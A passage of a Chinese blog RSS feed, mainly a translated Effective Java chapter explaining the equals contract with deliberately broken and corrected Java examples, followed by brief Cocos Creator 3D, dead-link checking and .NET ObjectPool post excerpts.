&lt;p&gt;  &lt;strong&gt;对称性（Symmetry）&lt;/strong&gt;————第二个要求是说，任何两个对象对于“他们是否相等”的问题都必须保持一致。与第一个要求不同，若无意中违反第一条，这种情形倒是不难想象。例如，考虑下面的类，它实现了一个区分大小写的字符串。字符串由toString保存，但在比较操作中被忽略：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Broken - violates symmetry!
public final class CaseInsensitiveString {
    private final String s;
    public CaseInsensitiveString(String s) {
        this.s = Objects.requireNonNull(s);
    }
    // Broken - violates symmetry!
    @Override public boolean equals(Object o) {
        if (o instanceof CaseInsensitiveString)
            return s.equalsIgnoreCase(((CaseInsensitiveString) o).s);
        if (o instanceof String) // One-way interoperability!
            return s.equalsIgnoreCase((String) o);
        return false;
    }
    ... // Remainder omitted
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  在这个类中，equals方法的意图非常好，它企图与普通的字符串（String）对象进行互操作。假设我们有一个不区分大小写的字符串和一个普通的字符串：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;CaseInsensitiveString cis = new CaseInsensitiveString(&quot;Polish&quot;);
String s = &quot;polish&quot;;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;正如所料，&lt;code&gt;cis.equals(s)&lt;/code&gt;返回true。问题在于，虽然CaseInsensitiveString类中的equals方法知道普通的字符串（String）对象，但是String类中的equals方法却并不知道不区分大小写的字符串。因此，&lt;code&gt;s.equals(cis)&lt;/code&gt;返回false，显然违反了对称性。假设你把不区分大小写的字符串对象放到一个集合中：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;List&amp;lt;CaseInsensitiveString&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
list.add(cis);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时list.contains(s)会返回什么结果呢？谁能知道？在当前OpenJDK的实现中，它碰巧返回的是false，但这只是这个特定实现得出的结果而已。在其他的视线中，它有可能返回true，或者抛出一个运行时异常。&lt;strong&gt;一旦你违反了equals约定，当其他对象面对你的对象的时候，你完全不知道这些对象的行为会怎么样。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;  为了解决这个问题，只需要把企图与String互操作的这段代码从equals中去掉就可以了。这样做以后，就可以重构该方法，使它变成一条单独的返回语句：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override public boolean equals(Object o) {
    return o instanceof CaseInsensitiveString &amp;amp;&amp;amp; ((CaseInsensitiveString) o).s.equalsIgnoreCase(s);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  &lt;strong&gt;传递性&lt;/strong&gt;————equals约定的第三个要求是，如果第一个对象等于第二个对象，并且第二个对象等于第三个对象，则第一个对象一定等于第三个对象。同样地，无意识地违反这条规则的情形也不难想象。考虑子类的情形，它将一个新的值组件（value component）添加到了超类中。换句话说，子类增加的信息会影响到equals的比较结果。我们首先以一个简单的不可变的二维整数型Point类作为开始：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Point {
    private final int x;
    private final int y;
    public Point(int x, int y) {
        this.x = x;
        this.y = y;
    }
    @Override public boolean equals(Object o) {
        if (!(o instanceof Point))
            return false;
        Point p = (Point)o;
        return p.x == x &amp;amp;&amp;amp; p.y == y;
    }
    ... // Remainder omitted
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;假设你想要继承这个类，为一个点添加颜色信息：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ColorPoint extends Point {
    private final Color color;
    public ColorPoint(int x, int y, Color color) {
        super(x, y);
        this.color = color;
    }
    ... // Remainder omitted
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  equals方法会怎么样呢？如果完全不提供equals方法，而是直接从Point继承过来，在equals做比较的时候颜色信息就被忽略掉了。虽然这样做不会违反equals约定，但是很明显是无法接受的。假设你编写了一个equals方法，只有当它的参数是另一个有色点，并且具有相同的位置和颜色时，它才会返回true：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Broken - violates symmetry!
@Override public boolean equals(Object o) {
    if (!(o instanceof ColorPoint))
        return false;
    return super.equals(o) &amp;amp;&amp;amp; ((ColorPoint) o).color == color;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  这种方法的问题在于，当将一个点与一个颜色点进行比较时，可能会得到不同的结果，反之亦然。前一种比较忽略了颜色信息，而后一种比较则总是返回false，因为参数的类型不正确。为了直观地说明问题所在，我们创建一个点和有色点：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Point p = new Point(1, 2);
ColorPoint cp = new ColorPoint(1, 2, Color.RED);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，&lt;code&gt;p.equals(cp)&lt;/code&gt;返回true，cp.equals(p)则返回false。你可以做这样的尝试来修正这个问题，让ColorPoint.equals在进行“混合比较”时忽略颜色信息：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Broken - violates transitivity!
@Override public boolean equals(Object o) {
    if (!(o instanceof Point))
        return false;
    // If o is a normal Point, do a color-blind comparison
    if (!(o instanceof ColorPoint))
        return o.equals(this);
    // o is a ColorPoint; do a full comparison
    return super.equals(o) &amp;amp;&amp;amp; ((ColorPoint) o).color == color;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种方法确实提供了对称性，但是却牺牲了传递性：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;ColorPoint p1 = new ColorPoint(1, 2, Color.RED);
Point p2 = new Point(1, 2);
ColorPoint p3 = new ColorPoint(1, 2, Color.BLUE);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时，&lt;code&gt;p1.equals(p2)&lt;/code&gt;和&lt;code&gt;pe.equals(p3)&lt;/code&gt;都是返回true，但是&lt;code&gt;p1.equals(p3)&lt;/code&gt;则返回false，很显然违反了传递性。前两种比较不考虑颜色信息（“色盲”），而第三种比较则考虑了颜色信息。&lt;/p&gt;
&lt;p&gt;  同样，这种方法可以导致无限递归：假设有两个Point的子类，叫做ColorPoint和SmellPoint，每一个子类都使用这种equals方法，那么调用myColorPoint。equals(mySmellPonit)将会抛出一个堆栈溢出的异常（StackOverflowError）。&lt;/p&gt;
&lt;p&gt;  那么怎么解决呢？这是面向对象语言中关于等价关系的一个基本问题。&lt;strong&gt;我们无法在扩展可实例化的类的同事，既增加新的值组件，同时又保留equals约定，&lt;/strong&gt;除非愿意放弃面向对象的抽象所带来的优势。&lt;/p&gt;
&lt;p&gt;  你可能听说，在equals方法中用getClass测试代替instanceof测试，可以扩展可实例化的类和增加新的值组件，同时保留equals约定：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Broken - violates Liskov substitution principle (page 43)
@Override public boolean equals(Object o) {
    if (o == null || o.getClass() != getClass())
        return false;
    Point p = (Point) o;
        return p.x == x &amp;amp;&amp;amp; p.y == y;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  这段程序只有当对象具有相同的实现时，才能使对象等同。虽然这样也不算太糟糕，但是结果却是无法接受的：Point子类的一个实例仍然是一个Point，它仍然需要作为一个函数运行，但是如果采用这种方法它就不能这样做！ 让我们假设我们想要写一个方法来判断一个点是否在单位圆上。 这是我们可以做到的一种方式：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Initialize unitCircle to contain all Points on the unit circle
private static final Set&amp;lt;Point&amp;gt; unitCircle = Set.of(
    new Point( 1, 0), new Point( 0, 1),
    new Point(-1, 0), new Point( 0, -1));

public static boolean onUnitCircle(Point p) {
    return unitCircle.contains(p);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  虽然这可能不是实现这种功能的最快方式，不过它的效果很好。但是假设你通过某种不添加值组件的方式扩展了Point，例如让它的构造器记录创建了多少个实例：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CounterPoint extends Point {
    private static final AtomicInteger counter = new AtomicInteger();
    public CounterPoint(int x, int y) {
        super(x, y);
        counter.incrementAndGet();
    }
    public static int numberCreated() { return counter.get(); }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  里氏替换原则（Liskov substitution principle）认为，一个类型的任何重要属性也将适用于它的子类型，因此为该类型编写的任何方法，在它的子类型上也应该同样运行得很好[Liskov87]。这是我们早期的正式声明，即Ponit（如CounterPoint）的子类仍然是Point，并且必须作为一个Point来工作。但是假设我们将CounterPoint传递给onUnitCircle方法。 如果Point类使用基于getClass的equals方法，则无论CounterPoint实例的x和y坐标如何，onUnitCircle方法都将返回false。之所以如此，是因为像onUnitCircle方法所用的是HashSet这样的集合，利用equals方法检验包含条件【即在Set集合中插入对象的时候会先检查该对象是否已存在】，没有任何CounterPonit实例与任何Point实例对应。但是，如果在Point上使用适当的基于instanceof的equals方法，当遇到CounterPoint时，相同的onUnitCircle方法就可以正常工作。&lt;/p&gt;
&lt;p&gt;  虽然没有一种令人满意的办法可以即扩展不可实例化的类，又增加值组件，但还是有一种不错的权宜之计（workaround）：根据第18项的建议：组合优先于继承。我们不再让ColorPoint扩展Point，而是在ColorPoint中加入一个私有的Point字段，以及一个公有的视图（view）方法（第6项），此方法返回一个与该有色点处在相同位置的普通Point对象：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Adds a value component without violating the equals contract
public class ColorPoint {
    private final Point point;
    private final Color color;
    public ColorPoint(int x, int y, Color color) {
        point = new Point(x, y);
        this.color = Objects.requireNonNull(color);
    }

    /**
    * Returns the point-view of this color point.
    */
    public Point asPoint() {
        return point;
    }
    @Override public boolean equals(Object o) {
        if (!(o instanceof ColorPoint))
            return false;
        ColorPoint cp = (ColorPoint) o;
        return cp.point.equals(point) &amp;amp;&amp;amp; cp.color.equals(color);
    }
    ... // Remainder omitted
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  在Java平台类库中，有一些类扩展了可实例化的类，并添加了新的值组件。例如，java.sql.Timestamp对java.util.Date进行了扩展，并增加了nanoseconds字段。Timestamp的equals实现却是违反了对称性，如果Timestamp和Date对象被用于同一个集合中，或者以其他方式被混合在一起，则会引起不正确的行为。Timestamp类有一个免责声明，告诫程序猿不要混合使用Date和Timestamp对象。只要你不把它们混合在一起，就不会有麻烦，除此之外没有其他的措施可以防止你这么做，而且结果导致的错误将很难调试。Timestamp类的这种行为是个错误，不值得效仿。&lt;/p&gt;
&lt;p&gt;  注意，你可以在一个抽象（abstrace）类的子类中增加新的值组件，而不会违反equals约定。这对于类层次结构很重要，您可以通过遵循第23项中的建议“用类层次（class hierarchies）代替标签类（tagged classes）”来获得类层次结构。例如，你可能有一个抽象的Shap类，它没有任何值组件，Circle子类添加了一个radius字段，Rectangle子类添加了length和width字段。只要不可能直接创建超类的实例，前面所述的种种问题就都不会发生。&lt;/p&gt;
&lt;p&gt;  &lt;strong&gt;一致性（Consistency）&lt;/strong&gt;————equals约定的第四个要求是，如果两个对象相等，他们就必须始终保持相等，除非它们中有一个（或者两个都）被修改了。换句话说，可变对象在不同的时候可以与不同的对象相等，而不可变对象则不会这样。当你在写一个类的时候，应该仔细考虑清楚它是否应该是不可变的（第17项）。如果认为它应该是不可变的，就必须保证equals方法满足这样的限制条件：相等的对象永远相等，不相等的对象永远不相等。&lt;/p&gt;
&lt;p&gt;  无论类是否是不可变的，都不要使equals方法依赖于不可靠的资源。如果你违反了这个禁令，就很难满足一致性要求。例如，java.net.URL的equals方法依赖于对URL中主机IP地址的比较。将一个主机名转变成IP地址可能需要访问网络，随着时间的推移，不确保会产生相同的结果。这样会导致URL的equals方法违反equals约定，在实践中有可能引发一些问题。URL中equals方法的这种行为是一个很大的错误，而且不应该被效仿。遗憾的是，因为兼容性的要求，这一行为无法被改变。为了避免这种问题，equals方法应该只对驻留在内存的对象执行确定性计算。&lt;/p&gt;
&lt;p&gt;  &lt;strong&gt;非空性（Non-nullity）&lt;/strong&gt;————最后一个要求没有名称，我姑且称它为“非空性（Non-nullity）”。意思是指所有对象都必须不等于null。虽然很难想象在调用o.equals（null）时偶然返回true，但不难想象会不小心抛出NullPointerException。通用约定是禁止这样做的。许多类的equals方法都通过一个显示的null测试来防止这种情况：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override public boolean equals(Object o) {
    if (o == null)
        return false;
    ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  这项测试是不必要的。为了测试其参数的等同性，equals方法必须先把参数转换成适当的类型，以便可以调用它的访问方法（accessor），或者访问它的字段。在进行转换之前，equals方法必须使用instanceof操作符，检查其参数是否为正确的类型：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override public boolean equals(Object o) {
    if (!(o instanceof MyType))
        return false;
    MyType mt = (MyType) o;
    ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  如果漏掉了这一步的类型检查，并且传递给equals方法的参数又是错误的类型，那么equals方法就会抛出&lt;code&gt;ClassCastException&lt;/code&gt;异常，这就违反了equals的约定。但是，如果instanceof的第一个运算对象（operand）是null，那么，不管第二个操作对象（operand）是哪种类型，instanceof操作符都会返回false[JLS, 15.20.2]，因此，如果把null传递给equals方法，类型检查就会返回false，所以不需要单独的null检查。&lt;/p&gt;
&lt;p&gt;  结合所有这些要求，得出了以下实现高质量equals方法的诀窍：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;使用==操作符检查“参数是否为这个对象的引用”。&lt;/strong&gt; 如果是，则返回true。这只不过是一种性能优化，如果比较操作有可能很昂贵，就值得这么做。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用instanceof操作符检查“参数是否为正确的类型”。&lt;/strong&gt; 如果不是，则返回false，一般来说，所谓的“正确的类型”是指equals方法所在的那个类。有些情况下，它是指该类所实现的某个接口。如果类实现的接口改进了equals约定，允许在实现了该接口的类之间进行比较，那么就使用接口。集合接口（collection interfaces）如Set、List、Map和Map.Entry具有这样的特性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;把参数转换成正确的类型。&lt;/strong&gt; 因为转换之前进行过instanceof测试，所以确保会成功。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对于该类中的每个“关键（significant）”字段，检查参数中的字段是否与该对象中对应的字段相匹配。&lt;/strong&gt; 如果这些测试全部成功，则返回true，否则返回false。如果第2步中的类型是个借口，就必须通过接口方法访问参数中的字段；如果该类型是类，也许就能够直接访问参数中的字段，这就要取决于它们的可访问性。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;  对于既不是float类型也不是double类型的基本类型字段，可以使用&lt;code&gt;==&lt;/code&gt;操作符进行比较；对于对象引用类型的字段，可以递归地调用equals方法；对于float字段，可以使用静态方法&lt;code&gt;Float.compare(float, float)&lt;/code&gt;方法进行比较；对于double字段，使用&lt;code&gt;Double.compare(double,double)&lt;/code&gt;。对float和double字段进行特殊的处理是有必要的，因为存在着Float.NaN、-0.0f以及类似的double常量；详细信息请参考JLS 15.21.1或者Float.equals的文档。虽然你可以使用静态方法Float.equals和Double.equals来比较float和double字段，但是这会在每次比较时产生自动装箱，这会导致性能不佳。 对于数组字段，请将这些指导原则应用于每个元素。 如果数组字段中的每个元素都很重要，请使用Arrays.equals方法中的其中一个方法进行比较。&lt;/p&gt;
&lt;p&gt;  有些对象引用类型的字段包含null可能是合法的，所有，为了避免可能导致的NullPointerException异常，使用静态方法&lt;code&gt;Objects.equals(Object, Object)&lt;/code&gt;来检查这些字段是否相等。&lt;/p&gt;
&lt;p&gt;  对于有些类，例如CaseInsensitiveString类，字段的比较要比简单的相等性测试复杂得多。如果是这种情况，可能会希望保存该字段的一个“范式（canonical form）”，这样equals方法就可以根据这些范式进行低开销的精确比较，而不是高开销的非精确比较。这种方法对于不可变类（第17项）是最为合适的；如果对象可能发生变化，就必须保证其范式保持最新。&lt;/p&gt;
&lt;p&gt;  字段的比较顺序可能会影响到equals方法的性能。为了获得最佳的性能，你应该最先比较最有可能不一致的字段，或者是开销最低的字段，最理想的情况是两个条件同时满足的字段。你不应该去比较那些不属于对象逻辑状态的字段，例如用于同步操作的Lock字段。您不需要去比较那些可以从关键字段计算出来的派生字段（derived fields），但是这样做【比较派生字段】有可能提高equals方法的性能。如果派生字段代表了整个对象的综合描述，比较这个字段可以节省当比较失败时去比较实际数据所需要的开销【也就是说当（条件一）派生对象可以代表两个对象是否相等的时候，同时（条件二）比较这个派生字段的开销比比较实际数据的开销小的情况下，我们可以使用派生字段进行对象是否相等的比较】。例如，假设有一个Polygon类，并缓存了该区域。如果两个多边形【Polygon的实例】有着不同的区域，就没有必要去比较他们的边和至高点。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;当你编写完equals方法之后，应该问你自己三个问题：它是否具有对称性？是否具有传递性？是否具有一致性？&lt;/strong&gt; 并且不要只是自问，还要编写单元测试来检验这些特性，除非你使用AutoValue【谷歌的一个开源框架，下面有提到】（原文49页）自动生成equals方法，在这种情况下，您可以安全地忽略测试。如果属性无法保持，找出原因，并相应地修改equals方法。当然，你的equals方法也必须满足另外两个属性（自反性和非空性），但这两个一般是相通的（If the properties fail to hold, figure out why, and modify the equals method accordingly. Of course your equals method must also satisfy the other two properties (reflexivity and non-nullity), but these two usually take care of themselves）。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;  在这个简单的PhoneNumber类中显示了根据前面的诀窍构造的equals方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Class with a typical equals method
public final class PhoneNumber {
    private final short areaCode, prefix, lineNum;
    public PhoneNumber(int areaCode, int prefix, int lineNum) {
        this.areaCode = rangeCheck(areaCode, 999, &quot;area code&quot;);
        this.prefix = rangeCheck(prefix, 999, &quot;prefix&quot;);
        this.lineNum = rangeCheck(lineNum, 9999, &quot;line num&quot;);
    }
    private static short rangeCheck(int val, int max, String arg) {
        if (val &amp;lt; 0 || val &amp;gt; max)
            throw new IllegalArgumentException(arg + &quot;: &quot; + val);
        return (short) val;
    }
    @Override public boolean equals(Object o) {
        if (o == this)
            return true;
        if (!(o instanceof PhoneNumber))
            return false;
        PhoneNumber pn = (PhoneNumber)o;
        return pn.lineNum == lineNum &amp;amp;&amp;amp; pn.prefix == prefix &amp;amp;&amp;amp; pn.areaCode == areaCode;
    }
    ... // Remainder omitted
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  下面是最后的一些说明：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;重写equals方法时总要重写hashCode方法（第11项）。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不要企图让equals方法过于智能。&lt;/strong&gt; 如果只是简单地测试域中的值是否相等，则不难做到遵守equals约定。如果想过度地去寻求各种等价关系，则很容易陷入麻烦之中。把任何任何一种别名形式考虑到等价的范围内，往往是一个坏主意。例如，File类不应该试图把指向同一个文件的符号链接（symbolic link）当做相等的对象来看待。所幸File类没有这样做。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不要将equals声明中的Object对象替换为其他的类型。&lt;/strong&gt; 程序猿编写出下面这样的equals方法并不少见，这会使程序猿花上数小时都搞不清为什么它不能正常工作：&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Broken - parameter type must be Object!
public boolean equals(MyClass o) {
    ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  问题在于，这个方法并没有重写Object.equals方法，因为它的参数应该是Object类型，相反，它重载了Object.equals（第52项）。在原有equals方法的基础上，再提供一个“强类型（strongly typed）”的equals方法，这是无法接受的，因为它可能导致子类中的Override注释产生误报并提供错误的安全感（because it can cause Override annotations in subclasses to generate false positives and provide a false sense of security）【可能会导致子类中的Override注释在编译的时候报错】。&lt;/p&gt;
&lt;p&gt;  Override注释的用法一致，就如本项中所示，可以防止犯这种错误（第40项）。这个equals方法不能编译，错误消息将会告诉你到底哪里出了问题：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Still broken, but won’t compile
@Override public boolean equals(MyClass o) {
    ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  编写和测试equals（和hashCode）方法很繁琐，结果代码很平常。 手动编写和测试这些方法的一个很好的替代方法是使用Google的开源AutoValue框架，该框架会自动为您生成这些方法，由类中的单个注释触发。 在大多数情况下，AutoValue生成的方法与您自己编写的方法基本相同。&lt;/p&gt;
&lt;p&gt;  IDE也有生成equals和hashCode方法的工具，但结果源代码比使用AutoValue的代码更冗长，更不易读，不会自动跟踪类中的更改，因此需要测试。 也就是说，让IDE生成equals（和hashCode）方法通常比手动实现它们更可取，因为IDE不会造成粗心的错误，人类也会这样做。&lt;/p&gt;
&lt;p&gt;  总之，不要重写equals方法，除非您不得不这么做：在许多情况下，从Object继承的实现完全符合您的要求。 如果你确实重写了equals，请确保比较所有类的关键字段，并使用之前提到的五个诀窍对它进行测试（If you do override equals, make sure to compare all of the class’s significant fields and to compare them in a manner that preserves all five provisions of the equals contract）。&lt;/p&gt;
</description>
<pubDate>Sat, 19 Oct 2019 00:00:00 +0000</pubDate>
<dc:creator>coloured_glaze</dc:creator>
<og:description>&amp;emsp;&amp;emsp;重写equals方法看起来似乎很简单，但是有许多重写方式会导致错误，而且后果非常严重。最容易避免这类问题的办法就是不覆盖equals方法，在这种情况下，类的每个实例都只能与它自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/coloured_glaze/p/11702733.html</dc:identifier>
</item>
<item>
<title>Creator3D 守护你的球球—UV动画与天空盒 - 张晓衡</title>
<link>http://www.cnblogs.com/creator-star/p/11702719.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/creator-star/p/11702719.html</guid>
<description>&lt;h3 id=&quot;游戏预览&quot;&gt;1 游戏预览&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072759866-1389978861.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在线体验地址：&lt;a href=&quot;http://example.creator-star.cn/follo-ball/&quot; class=&quot;uri&quot;&gt;http://example.creator-star.cn/follo-ball/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;场景物体&quot;&gt;2 场景物体&lt;/h3&gt;
&lt;p&gt;场景物体&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072805907-1762407096.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;新建场景后，引擎会为我们创建默认的摄像机和灯光，这个我们就不介绍了，如果不太了解，可以参考之前的文章。我们先介绍一下游戏中的物体：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;地面：地面使用 Plane 创建，将他的Z深度设置为10米，同时为地面定制了一个材质贴图；&lt;/li&gt;
&lt;li&gt;吸盘：吸盘是由 Torus 圆环体创建，定制了专用材质，而且还有一个向里面吸入的UV动画（下面一小节），同时为它添加了一个球体碰撞组件，但不添加刚体组件，我只需要使用碰撞组件监听它与障碍物的碰撞，不需要物理表现；&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072806639-1900006688.jpg&quot;/&gt;&lt;/li&gt;
&lt;li&gt;守护球：守护球是由 Sphere 球体创建，同样只需要一个球体碰撞组件，球的旋转是我们由tween模拟的，并不是真实的物理效果；&lt;/li&gt;
&lt;li&gt;障碍物体：障碍物是 Cube 立方体搭建的，在节点上挂载了碰撞组件与刚体，当吸盘将柱子吸走后，上面的横条会下落碰到我们的守护球，这个掉落需要使用物理引擎来解决；&lt;/li&gt;
&lt;li&gt;终点：终点也是一个Cube，当守护球碰到它后表示过关；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;uv动画编辑&quot;&gt;3 UV动画编辑&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072814076-821192464.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;游戏的内容比较简单，使用我们之前讲过的【打砖块】游戏中的内容就可以搞定，唯一这里新增加了吸盘动画，我们看下它是怎么制作的，不用写代码的哦。&lt;/p&gt;
&lt;p&gt;首先为 Torus 节点添加一个 Animation 组件，看下图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072815136-1729761652.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;切换到动画编辑器窗口，点添加 AnimationClip，如图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072816077-760608124.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在动画属性列表中，添加动画属性 tilingOffset，如图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072816935-424101153.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们给 tilingOffset 属性 K 两个关键帧，在关键帧上，将它的 w 属性分别设置为 0 和 1：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072814076-821192464.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;保存退出动画编辑器，同时记得将 Animation 组件的 PlayOnLoad 属性勾选上，就搞定了。&lt;/p&gt;
&lt;h3 id=&quot;天空盒编辑&quot;&gt;4 天空盒编辑&lt;/h3&gt;
&lt;p&gt;为了让游戏更具有沉浸感，我们来模拟一个真实世界，为游戏添加天空盒。&lt;/p&gt;
&lt;p&gt;首先创建天空盒资源，选中一个目录，鼠标右键菜单 CubeMap 选项，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072824110-1633207191.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我在网上找了一个天空盒资源，设置天空盒6个面的图片，看下图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072825561-824666680.jpg&quot;/&gt;&lt;br/&gt;需要注意，我这个资源中的 Left 与 Right 在 Creator 中是需要交换一下，你可以看到下面的预览，六张图需要完美接缝。&lt;/p&gt;
&lt;p&gt;接下来选择 Scene 节点，将天空盒资源拖动到属性：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072827795-1247680083.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这时我们在场景编辑中就可以看到了，不过这里需要注意，Shawn在这里卡了十几分钟，运行预览天空盒还不能被显示出来。我是向引擎组大佬求助，才知道，在摄像机上还有一个开关，看图：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072828067-932694702.png&quot; alt=&quot;file&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此我们的游戏场景就全部布局好了，是不是很 Nice 呢！&lt;/p&gt;
&lt;h3 id=&quot;小结&quot;&gt;5 小结&lt;/h3&gt;
&lt;p&gt;本篇文章介绍了”守护球球“这个游戏的场景布局，以及吸盘动画、天空盒。接下来就是障碍物的布置，这完全是一个消耗体力与精力的活，不知道是不是引擎BUG，游戏中出现一些 Cube 不能掉落，而且障碍物多了，在手机上会有些卡顿，真的是非常纠结。&lt;/p&gt;
&lt;p&gt;下次分析一下游戏中的控制代码，为了控制流畅，改了不下十几种方法，这个可是把 Shawn 拆腾快哭了，最后求给个赞，原创不易！！！&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1755688/201910/1755688-20191019072829039-1085870358.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 18 Oct 2019 23:28:00 +0000</pubDate>
<dc:creator>张晓衡</dc:creator>
<og:description>1 游戏预览 在线体验地址：http://example.creator star.cn/follo ball/ 2 场景物体 场景物体 新建场景后，引擎会为我们创建默认的摄像机和灯光，这个我们就不介</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/creator-star/p/11702719.html</dc:identifier>
</item>
<item>
<title>python-批量检查死链问题 - 川山甲</title>
<link>http://www.cnblogs.com/baochuan/p/11702706.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/baochuan/p/11702706.html</guid>
<description>[unable to retrieve full-text content]背景 线上出现很多死链图片，导致在转存的时候出现大面积的无效图。如： 死链带来的影响： 影响功能、用户体验。 减少搜索引擎的收录页面数量，降低网站在搜索引擎中的权重。 影响网站加载速度。 损伤网站的整体形象。 处理方式 处理方式： 1、利用地址来处理，发现死链图片地址都不一样。 2、利用图片内容来处</description>
<pubDate>Fri, 18 Oct 2019 22:42:00 +0000</pubDate>
<dc:creator>川山甲</dc:creator>
<dc:language>zh</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://account.cnblogs.com/signin?ReturnUrl=https://www.cnblogs.com/baochuan/p/11702706.html</dc:identifier>
</item>
<item>
<title>.Net Core中的ObjectPool - MicroHeart！</title>
<link>http://www.cnblogs.com/MicroHeart/p/11701647.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/MicroHeart/p/11701647.html</guid>
<description>&lt;h3&gt;一、对象池　　&lt;/h3&gt;
&lt;p&gt;　　运用对象池化技术可以显著地提升性能，尤其是当对象的初始化过程代价较大或者频率较高。下面是ObjectPool源码中涉及的几个类。当你看过.Net Core源码很多时，你会发现，微软的开发很多都是这种模式，通过Policy构建Provider，通过Provider创建最终的类。&lt;/p&gt;
